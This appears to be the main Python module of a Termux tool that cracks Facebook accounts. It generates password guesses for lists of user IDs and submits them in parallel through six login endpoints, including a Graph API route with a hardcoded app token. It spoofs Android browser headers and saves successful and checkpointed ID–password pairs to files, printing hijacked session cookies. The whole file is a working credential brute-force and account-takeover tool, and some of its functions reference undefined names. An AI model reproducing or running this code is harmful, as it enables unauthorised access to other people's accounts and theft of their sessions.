from bs4 import BeautifulSoup as bs
from Settings import setting
from concurrent.futures import ThreadPoolExecutor as Th
import requests, sys, random, time, os, base64, uuid, json, string
import main_menu, Utils, main_user_agent


class Main():
    def __init__(self, data=None, password=None, limit=None, method_login=None, features=None):
        self.co = main_menu.__logo__
        self.method_login = method_login
        self.type_pwd = password
        self.limit_id = limit
        self.files = data
        self.ok = []
        self.cp = []
        if "file" == features:
            self.__o__()
        elif "random" == features:
            main_menu.__logo__.logo()
            print(f"{self.co.white}Password Type {self.co.red}: {self.co.sky}Random Auto")
            print(f"{self.co.white}Login Method {self.co.red}:{self.co.sky} {self.method_login}")
            print(f"{self.co.white}Total ID {self.co.red}: {self.co.sky}{self.limit_id}")
            print(f"{self.co.white}Used Code {self.co.red}: {self.co.sky}{self.files}")
            main_menu.__logo__.line()
            datas = Utils.Generate_password_and_random_number.Generate_Random_number(self.files, self.limit_id)
            self.method_analysis(datas)
        elif "gmail" == features:
            pass
    
    def check(self):
        main_menu.__logo__.line()
        print(f"{main_menu.__logo__.white}1 {main_menu.__logo__.green}Possible Password")
        print(f"{main_menu.__logo__.white}2 {main_menu.__logo__.green}Fewer Password")
        print(f"{main_menu.__logo__.white}3 {main_menu.__logo__.green}More Password")
        main_menu.__logo__.line()
        x = input(f"{main_menu.__logo__.white}Put Password Type {main_menu.__logo__.red}: ")
        if x == "1":
            main_menu.__logo__.logo()
            print(f"{self.co.white}Password Type {self.co.red}: {self.co.sky}Possible")
            print(f"{self.co.white}Login Method {self.co.red}:{self.co.sky} {self.method_login}")
            print(f"{self.co.white}Total ID {self.co.red}: {self.co.sky}{self.limit_id}")
            main_menu.__logo__.line()
            self.method_analysis(Utils.Generate_password_and_random_number.Generate_Password_Possible(self.files))
        elif x == "2":
            main_menu.__logo__.logo()
            print(f"{self.co.white}Password Type {self.co.red}: {self.co.sky}Possible")
            print(f"{self.co.white}Login Method {self.co.red}:{self.co.sky} {self.method_login}")
            print(f"{self.co.white}Total ID {self.co.red}: {self.co.sky}{self.limit_id}")
            main_menu.__logo__.line()
            self.method_analysis(Utils.Generate_password_and_random_number.Generate_Password_Fewer(self.files))
        elif x == "3":
            main_menu.__logo__.logo()
            print(f"{self.co.white}Password Type {self.co.red}: {self.co.sky}Possible")
            print(f"{self.co.white}Login Method {self.co.red}:{self.co.sky} {self.method_login}")
            print(f"{self.co.white}Total ID {self.co.red}: {self.co.sky}{self.limit_id}")
            main_menu.__logo__.line()
            self.method_analysis(Utils.Generate_password_and_random_number.Generate_Password_More(self.files))
        else:
            sys.exit(f"{main_menu.__logo__.red}Not Match With Your Choice")
    
    def get_pass(self):
        main_menu.__logo__.line()
        xz = int(input(f"{main_menu.__logo__.white}How many want to put password {main_menu.__logo__.red}:{main_menu.__logo__.green} "))
        main_menu.__logo__.line()
        print(f"{main_menu.__logo__.green}Use Sure to given- {main_menu.__logo__.blue}first, last, firstlast, name, Name, unspace, Unspace")
        main_menu.__logo__.line()
        user_password = []
        for i in range(1, xz+1):
            x = input(f"{main_menu.__logo__.white}Put Password {main_menu.__logo__.red}{i} : {main_menu.__logo__.green}")
            main_menu.__logo__.line()
            user_password.append(x)
        main_menu.__logo__.logo()
        print(f"{self.co.white}Password Type {self.co.red}: {self.co.sky}Manually")
        print(f"{self.co.white}Login Method {self.co.red}:{self.co.sky} {self.method_login}")
        print(f"{self.co.white}Total ID {self.co.red}: {self.co.sky}{self.limit_id}")
        main_menu.__logo__.line()
        self.method_analysis(Utils.Generate_password_and_random_number.Generate_Password_Manual(self.files, user_password))
        
    def __o__(self):
        match self.type_pwd:
            case 1:
                self.check()
            case 2:
                self.get_pass()
    
    def M(self, ID, i):
        try:
            ses = requests.Session()
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            web_data = ses.get("https://m.facebook.com").text
            req = bs(web_data, 'html.parser')
            data = {"lsd":req.find("input",{"name":"lsd"})["value"],"jazoest":req.find("input",{"name":"jazoest"})["value"],"m_ts":req.find("input",{"name":"m_ts"})["value"],"li":req.find("input",{"name":"li"})["value"],"try_number":"0","unrecognized_tries":"0","email":ID,"pass":i,"login":"submit","sign_up":"submit","bi_xrwh":"0","_fb_noscript":"true",}
            headers = {'authority': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5','cache-control': 'no-cache','dpr': '2','pragma': 'no-cache','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': main_user_agent.building.fun(setting.__tp__())[1],'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"3.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': main_user_agent.building.fun(setting.__tp__())[0],}
            ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8", data=data, headers=headers, allow_redirects=True)
            if "checkpoint" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["checkpoint"][13:28]
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")
            elif "c_user" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["c_user"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
        except requests.exceptions.ConnectionError:
            time.sleep(3)

    
    
    def MBASIC(self, ID, i):
        try:
            ses = requests.Session()
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            web_data = ses.get("https://mbasic.facebook.com").text
            req = bs(web_data, 'html.parser')
            data = {
                "lsd":req.find("input",{"name":"lsd"})["value"],
                "jazoest":req.find("input",{"name":"jazoest"})["value"],
                "m_ts":req.find("input",{"name":"m_ts"})["value"],
                "li":req.find("input",{"name":"li"})["value"],
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":ID,
                "pass":i,
                "login":"submit",
                "sign_up":"submit",
                "bi_xrwh":"0",
                "_fb_noscript":"true",}
            headers = {
                'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'referer': 'https://mbasic.facebook.com/login/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': f'"{main_user_agent.building.fun(setting.__tp__())[1]}"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': f'"{main_user_agent.building.fun(setting.__tp__())[2]}.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': main_user_agent.building.fun(setting.__tp__())[0],
                'viewport-width': '980',}
            ses.post("https://mbasic.facebook.com//login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8", data=data, headers=headers, allow_redirects=True)
            if "checkpoint" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["checkpoint"][13:28]
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")
            elif "c_user" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["c_user"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
        except requests.exceptions.ConnectionError:
            time.sleep(3)
            
            
    def ALPHA(self, ID, iq):
        try:
            ses = requests.Session()
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            web_data = ses.get("https://m.alpha.facebook.com").text
            req = bs(web_data, 'html.parser')
            data = {
                "lsd":req.find("input",{"name":"lsd"})["value"],
                "jazoest":req.find("input",{"name":"jazoest"})["value"],
                "m_ts":req.find("input",{"name":"m_ts"})["value"],
                "li":req.find("input",{"name":"li"})["value"],
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":ID,
                "pass":i,
                "login":"submit",
                "sign_up":"submit",
                "bi_xrwh":"0",
                "_fb_noscript":"true",}
            headers = {
                'authority': 'm.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'referer': 'https://m.alpha.facebook.com/login',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': f'"{main_user_agent.building.fun(setting.__tp__())[1]}"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': f'"{main_user_agent.building.fun(setting.__tp__())[2]}.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': main_user_agent.building.fun(setting.__tp__())[0],
                'viewport-width': '980',}
            ses.post("https://m.alpha.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2F&amp;refsrc=deprecated&amp;lwv=100&amp;refid=9",data=data, headers=headers, allow_redirects=True)
            if "checkpoint" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["checkpoint"][13:28]
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")
            elif "c_user" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["c_user"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
        except requests.exceptions.ConnectionError:
            time.sleep(3)
            
    def MESSENGER(self, ID, i):
        try:
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            ses = requests.Session()
            web_data = ses.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', web_data).group(1)
            req = bs(web_data, "html.parser")
            web_data = ses.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', web_data).group(1)
            req = bs(web_data, "html.parser")
            headers = {
                'authority': 'www.messenger.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'referer': 'https://www.messenger.com/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': main_user_agent.building.fun(setting.__tp__())[0],}
            data = {
                "jazoest":req.find("input",{"name":"jazoest"})["value"],
                "lsd":req.find("input",{"name":"lsd"})["value"],
                "initial_request_id":req.find("input",{"name":"initial_request_id"})["value"],
                "timezone":"",
                "lgndim":"",
                "lgnrnd":req.find("input",{"name":"lgnrnd"})["value"],
                "lgnjs":req.find("input",{"name":"lgnjs"})["value"],
                "email":ID,
                "pass":i,
                "login":"submit",
                "persistent":"1",
                "default_persistent":"",}
            response = ses.post("https://www.messenger.com/login/password/",data=data,headers=headers,cookies={"cookie":f"wd=980x1848;dpr=2;_js_datr={datr}"},allow_redirects=False)
            if "c_user" in response.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["c_user"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
            elif "checkpoint" in str(response.headers):
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")

        except requests.exceptions.ConnectionError:
            time.sleep(3)
    
    def ASYNC(self, ID, i):
        try:
            ses = requests.Session()
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            web_data = ses.get("https://m.facebook.com").text
            req = bs(web_data, 'html.parser')
            data = {
                "lsd":req.find("input",{"name":"lsd"})["value"],
                "jazoest":req.find("input",{"name":"jazoest"})["value"],
                "m_ts":req.find("input",{"name":"m_ts"})["value"],
                "li":req.find("input",{"name":"li"})["value"],
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":ID,
                "pass":i,
                "login":"submit",
                "sign_up":"submit",
                "bi_xrwh":"0",
                "_fb_noscript":"true",}
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': main_user_agent.building.fun(setting.__tp__())[1],
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"3.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': main_user_agent.building.fun(setting.__tp__())[0],
                'viewport-width': '980',}
            ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=headers, allow_redirects=True)
            if "checkpoint" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["checkpoint"][13:28]
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")
            elif "c_user" in ses.cookies.get_dict():
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = ses.cookies.get_dict()["c_user"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    
    def API(self, ID, i):
        try:
            ses = requests.Session()
            sty = random.choice(["😋","🙃","😉","😏","😶","😎","😑","🤧","😛","😣","🤒","😴","😪","🙄","😬","😙","😜","🤗","🙂","😁"])
            sys.stdout.write(f"\r{self.co.white}[{sty}] [{ID}] [{self.limit_id}] {self.co.green}|OK|{len(self.ok)}{self.co.orange}|CP|{len(self.cp)}|")
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent":main_user_agent.building.fun(setting.__tp__())[0],"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ID,"password":i,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers,allow_redirects=False).text
            session = json.loads(response)
            if "session_key" in session:
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    ID = session["uid"]
                    self.ok.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__ok__.txt",'a').write(f"{ID}|{i}\n")
                    items = ";".join(i["name"]+"="+i["value"] for i in session["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sb};{items}"
                    print(f"\r{self.co.green}[OK] {ID}|{i}")
                    print(f"{self.co.white}[COOKIE]{self.co.green} {cookie}")
            elif "www.facebook.com" in session["error"]["message"]:
                if ID in self.ok or ID in self.cp:
                    pass
                else:
                    self.cp.append(ID)
                    open("/data/data/com.termux/files/home/Master/RESULTS/__cp__.txt",'a').write(f"{ID}|{i}\n")
                    print(f"\r{self.co.orange}[CP] {ID}|{i}")
        except requests.exceptions.ConnectionError:
            time.sleep(3)

    def method_analysis(self, datas):
        with Th(max_workers=30) as mx:
            if self.method_login == "1":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.M,ID,i)
            elif self.method_login == "2":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.MBASIC, ID, i)
            elif self.method_login == "3":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.ALPHA, ID, i)
            elif self.method_login == "4":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.MESSENGER, ID, i)
            elif self.method_login == "5":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.ASYNC, ID, i)
            elif self.method_login == "6":
                for x in datas:
                    ID, i = x.split("|")
                    mx.submit(self.API, ID, i)